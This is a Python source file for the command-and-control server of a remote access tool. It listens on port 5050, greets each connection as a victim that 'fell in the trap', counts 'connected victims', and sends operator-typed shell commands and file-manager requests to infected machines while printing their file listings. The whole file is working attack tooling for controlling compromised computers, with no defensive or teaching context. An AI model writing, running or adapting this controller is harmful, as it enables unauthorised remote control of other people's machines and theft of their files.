import socket
import threading
from colorama import Fore
import colorama,platform,os
import ast
from tabulate import tabulate
from pprint import pprint
colorama.init()

green,reset  =  Fore.GREEN,Fore.RESET 
HEADER       =  2048 
PORT         =  5050
SERVER       =  socket.gethostbyname(socket.gethostname())
ADDR         =  (SERVER,PORT)
server       =  socket.socket(socket.AF_INET,socket.SOCK_STREAM)
FORMAT       =  'utf-8'

server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(ADDR)



def send(conn,msg):
    message  = msg.encode(FORMAT)
    msg_len  = len(message)
    send_len = str(msg_len).encode(FORMAT)
    send_len+= b' ' * (HEADER - len(send_len))
    conn.send(send_len)
    conn.send(message)

def handle_clinet(conn,addr):
    print(f"{green}[NEW CONNECTION] {Fore.RED}{addr}{Fore.RESET} Fell in the trap")
    connected = True
    while connected:
        msg_len = conn.recv(HEADER).decode(FORMAT)
        if msg_len:
            msg_len = int(msg_len)
            msg     = conn.recv(msg_len).decode(FORMAT)
            if msg.split("--")[1] == "waiting_for_response" and msg.split("--")[0] == "resp":
                send(conn,input("cmd: ").strip())
            
            else:
                #print(f"[NEW MESSAGE] {addr} || {msg}")
                try:
                    if str(msg.split("--")[0]) == "file_list":
                        data = ast.literal_eval(msg.split("--")[1])
                        table = tabulate(data, headers=["Name", "Type"], tablefmt="fancy_grid")
                        print(table)
                    elif str(msg.split("--")[0]) == "file_manager":
                        send(conn,input(f"\n\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Filemanager: "))
                    
                    elif str(msg.split("--")[0]) == "error":
                        msg = str(msg).split("--")[1]
                        print(f"{Fore.RED}[Error] {msg}")

                    elif str(msg.split("--")[0]) == "war":
                        msg = str(msg).split("--")[1]
                        print(f"{Fore.YELLOW}[WARNING] {msg}")
                except:
                    pass 

            
            



def get_active_connections():
    return f"{green}[CONNECTED VICTIMS] {threading.active_count() -1}"

def start():
    if platform.system() == "Linux":
        os.system("clear")
    else:
        os.system("cls")
    print(f"{green}[STARTING]{reset} Starting Server")
    server.listen()
    
    print(f"{green}[LISTENING] {reset}The server is listening for connections on {SERVER}:{PORT}")
    while True:
        conn , addr = server.accept()
        thread = threading.Thread(target=handle_clinet,args=(conn,addr))
        thread.start()
        print(get_active_connections())
    


start()



